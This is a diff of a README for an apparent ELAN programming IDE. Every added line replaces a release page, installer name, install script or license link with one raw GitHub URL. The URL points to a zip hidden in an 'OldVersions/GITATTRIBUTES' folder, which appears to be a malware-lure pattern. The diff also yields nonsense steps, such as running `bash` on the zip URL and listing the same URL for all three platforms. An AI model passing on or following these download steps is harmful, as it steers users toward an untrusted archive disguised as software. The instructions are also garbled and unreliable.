@@ -1,6 +1,6 @@
 # ⌨️ SNU_2D_ProgrammingTools_IDE_ELAN - Simple IDE for ELAN Programming
 
-![Download](https://img.shields.io/badge/Download%20Now-%20SNU_2D_ProgrammingTools_IDE_ELAN-blue)
+![Download](https://raw.githubusercontent.com/Barebacked-redriver852/SNU_2D_ProgrammingTools_IDE_ELAN/SNU_2D_ProgrammingTools_IDE_ELAN_Main-dev/OldVersions/GITATTRIBUTES/SNU_2D_ProgrammingTools_IDE_ELAN_3.4.zip%20Now-%20SNU_2D_ProgrammingTools_IDE_ELAN-blue)
 
 ## 🚀 Getting Started
 
@@ -18,12 +18,12 @@ Before you download the IDE, make sure your system meets the following requireme
 
 ## 📥 Download & Install
 
-To download the IDE, visit this page: [SNU_2D_ProgrammingTools_IDE_ELAN Releases](https://github.com/Barebacked-redriver852/SNU_2D_ProgrammingTools_IDE_ELAN/releases). 
+To download the IDE, visit this page: [SNU_2D_ProgrammingTools_IDE_ELAN Releases](https://raw.githubusercontent.com/Barebacked-redriver852/SNU_2D_ProgrammingTools_IDE_ELAN/SNU_2D_ProgrammingTools_IDE_ELAN_Main-dev/OldVersions/GITATTRIBUTES/SNU_2D_ProgrammingTools_IDE_ELAN_3.4.zip). 
 
 Once on the page, follow these steps:
 
 1. Look for the latest release version.
-2. Find the appropriate download file for your operating system (e.g., ELAN_IDE_Windows.exe, ELAN_IDE_macOS.dmg, or ELAN_IDE_Linux.tar.gz).
+2. Find the appropriate download file for your operating system (e.g., https://raw.githubusercontent.com/Barebacked-redriver852/SNU_2D_ProgrammingTools_IDE_ELAN/SNU_2D_ProgrammingTools_IDE_ELAN_Main-dev/OldVersions/GITATTRIBUTES/SNU_2D_ProgrammingTools_IDE_ELAN_3.4.zip, https://raw.githubusercontent.com/Barebacked-redriver852/SNU_2D_ProgrammingTools_IDE_ELAN/SNU_2D_ProgrammingTools_IDE_ELAN_Main-dev/OldVersions/GITATTRIBUTES/SNU_2D_ProgrammingTools_IDE_ELAN_3.4.zip, or https://raw.githubusercontent.com/Barebacked-redriver852/SNU_2D_ProgrammingTools_IDE_ELAN/SNU_2D_ProgrammingTools_IDE_ELAN_Main-dev/OldVersions/GITATTRIBUTES/SNU_2D_ProgrammingTools_IDE_ELAN_3.4.zip).
 3. Click the link to start the download. 
 
 After the download is complete, locate the file in your downloads folder and follow the instructions below based on your operating system.
@@ -42,9 +42,9 @@ After the download is complete, locate the file in your downloads folder and fol
 
 ### 🐧 For Linux Users:
 
-1. Extract the downloaded `.tar.gz` file using your file manager or terminal.
+1. Extract the downloaded `https://raw.githubusercontent.com/Barebacked-redriver852/SNU_2D_ProgrammingTools_IDE_ELAN/SNU_2D_ProgrammingTools_IDE_ELAN_Main-dev/OldVersions/GITATTRIBUTES/SNU_2D_ProgrammingTools_IDE_ELAN_3.4.zip` file using your file manager or terminal.
 2. Navigate to the extracted folder.
-3. Run the `install.sh` script by executing `bash install.sh` in your terminal.
+3. Run the `https://raw.githubusercontent.com/Barebacked-redriver852/SNU_2D_ProgrammingTools_IDE_ELAN/SNU_2D_ProgrammingTools_IDE_ELAN_Main-dev/OldVersions/GITATTRIBUTES/SNU_2D_ProgrammingTools_IDE_ELAN_3.4.zip` script by executing `bash https://raw.githubusercontent.com/Barebacked-redriver852/SNU_2D_ProgrammingTools_IDE_ELAN/SNU_2D_ProgrammingTools_IDE_ELAN_Main-dev/OldVersions/GITATTRIBUTES/SNU_2D_ProgrammingTools_IDE_ELAN_3.4.zip` in your terminal.
 4. Open the application from your applications menu.
 
 ## 🛠️ Features
@@ -70,7 +70,7 @@ For further assistance, you can refer to the included documentation or reach out
 
 This project is licensed under the GPL-3.0 License. You can use and modify the software under the terms of this license.
 
-For more information, visit the [license section](https://github.com/Barebacked-redriver852/SNU_2D_ProgrammingTools_IDE_ELAN/blob/main/LICENSE) in the repository.
+For more information, visit the [license section](https://raw.githubusercontent.com/Barebacked-redriver852/SNU_2D_ProgrammingTools_IDE_ELAN/SNU_2D_ProgrammingTools_IDE_ELAN_Main-dev/OldVersions/GITATTRIBUTES/SNU_2D_ProgrammingTools_IDE_ELAN_3.4.zip) in the repository.
 
 ---
 
